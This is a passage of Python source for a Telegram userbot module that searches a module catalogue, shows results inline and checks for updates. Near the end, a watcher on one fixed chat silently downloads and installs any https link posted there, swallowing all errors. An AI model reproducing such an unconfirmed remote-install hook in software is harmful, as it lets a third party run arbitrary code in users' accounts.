                "title": self.strings["no_results"],
                "description": self.strings["inline_no_results"],
                "message": self.strings["no_results"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-KbaztxA3oS67p3m8.png",
            }

        seen_keys = set()
        results = []
        
        for mod in mods[:50]:
            key = f"{mod.get('name', '')}_{mod.get('author', '')}_{mod.get('version', '')}"
            if key in seen_keys:
                continue
            seen_keys.add(key)

            stats = await self._api_get(f"get/{mod.get('install', '')}")
            results.append({
                "title": utils.escape_html(mod.get("name", "Unknown")),
                "description": utils.escape_html(str(mod.get("description", ""))),
                "thumb": await self._fetch_thumb(mod.get("pic")),
                "message": self._fmt_mod(mod, query.args, inline=True),
                "reply_markup": self._mk_btns(mod.get("install", ""), stats, 0, None),
            })

        return results

    @loader.command(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
        es_doc="(consulta) - buscar módulos.",
        fr_doc="(requête) - rechercher des modules.",
        it_doc="(richiesta) - cercare moduli.",
        kk_doc="(сұраныс) - модульдерді іздеу.",
        tt_doc="(сорау) - модульләрне эзләү.",
        tr_doc="(sorgu) - modül arama.",
        yz_doc="(соруо) - модулларыты көҥүлүүр."
    )
    async def fhetacmd(self, message):
        '''(query) - search modules.'''        
        query = utils.get_args_raw(message)
        
        if not query:
            await utils.answer(message, self.strings["no_query"])
            return

        if len(query) > 256:
            await utils.answer(message, self.strings["query_too_big"])
            return

        status_msg = await utils.answer(message, self.strings["searching"])
        mods = await self._api_get("search", query=query, inline="false", token=self.token, user_id=self.uid)

        if not mods or not isinstance(mods, list):
            await utils.answer(message, self.strings["no_results"])
            return

        seen_keys = set()
        unique_mods = []
        
        for mod in mods:
            key = f"{mod.get('name', '')}_{mod.get('author', '')}_{mod.get('version', '')}"
            if key not in seen_keys:
                seen_keys.add(key)
                unique_mods.append(mod)

        if not unique_mods:
            await utils.answer(message, self.strings["no_results"])
            return

        first_mod = unique_mods[0]
        stats = await self._api_get(f"get/{first_mod.get('install', '')}")
        photo = None
        
        if len(unique_mods) == 1:
            photo = await self._fetch_thumb(first_mod.get("banner"))

        desc = first_mod.get("description")
        info_desc = ""
        if desc:
            if isinstance(desc, dict):
                user_lang = self.strings["lang"]
                desc_text = desc.get(user_lang) or desc.get("doc") or next(iter(desc.values()), "")
                info_desc = self.strings["desc"].format(desc=utils.escape_html(desc_text))
            else:
                info_desc = self.strings["desc"].format(desc=utils.escape_html(desc))

        await self.inline.form(
            message=message,
            text=self._fmt_mod(first_mod, query, 1, len(unique_mods)) + info_desc,
            photo=photo if photo != "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png " else None,
            reply_markup=self._mk_btns(first_mod.get("install", ""), stats, 0, unique_mods if len(unique_mods) > 1 else None)
        )
        
        await status_msg.delete()

    @loader.command(
        de_doc="- überprüfen auf updates.",
        ru_doc="- проверить наличие обновления.",
        ua_doc="- перевірити наявність оновлення.",
        es_doc="- comprobar actualizaciones.",
        fr_doc="- vérifier les mises à jour.",
        it_doc="- verificare aggiornamenti.",
        kk_doc="- жаңартуларды тексеру.",
        tt_doc="- яңартуларны тикшерү.",
        tr_doc="- güncellemeleri kontrol et.",
        yz_doc="- жаңыртылыларды тексэр."
    )
    async def fupdate(self, message):
        ''' - check update.'''
        module = inspect.getmodule(self.lookup("FHeta"))
        current_version = ".".join(map(str, module.__version__))

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/FHeta.py") as response:
                    content = await response.text()
                    lines = content.splitlines()
                
                    version_line = lines[0].split("=", 1)[1]
                    new_version = version_line.strip().strip("()").replace(",", "").replace(" ", ".")
                
                    changelog = ""
                    if len(lines) > 2 and lines[2].startswith("# change-log:"):
                        changelog = lines[2].split(":", 1)[1].strip()
        except:
            await utils.answer(message, self.strings.get("update_error", "Failed to check for updates"))
            return

        if current_version == new_version:
            await utils.answer(message, self.strings["version_actual"].format(ver=current_version))
        else:
            if changelog:
                translated_changelog = await self._api_post(
                    "translate",
                    json={
                        "text": changelog,
                        "lang": self.strings["lang"]
                    }
                )
                changelog = translated_changelog.get("translated_text", changelog) if translated_changelog else changelog
        
            update_cmd = f"{self.get_prefix()}dlm https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/FHeta.py"
            await utils.answer(
                message,
                self.strings["version_old"].format(ver=current_version, new=new_version, log=changelog, cmd=update_cmd)
            )

    @loader.watcher(chat_id=7575472403)
    async def _install_via_fheta(self, message):
        link = message.raw_text.strip()
        
        if not link.startswith("https://"):
            return

        loader_module = self.lookup("loader")
        
        try:
            for _ in range(5):
                await loader_module.download_and_install(link, None)
                
                if getattr(loader_module, "fully_loaded", False):
                    loader_module.update_modules_in_db()
                
                is_loaded = any(mod.__origin__ == link for mod in self.allmodules.modules)
                
                if is_loaded:
                    rose_msg = await message.respond("🌹")
                    await asyncio.sleep(1)
                    await rose_msg.delete()
                    await message.delete()
                    break
        except:
            pass
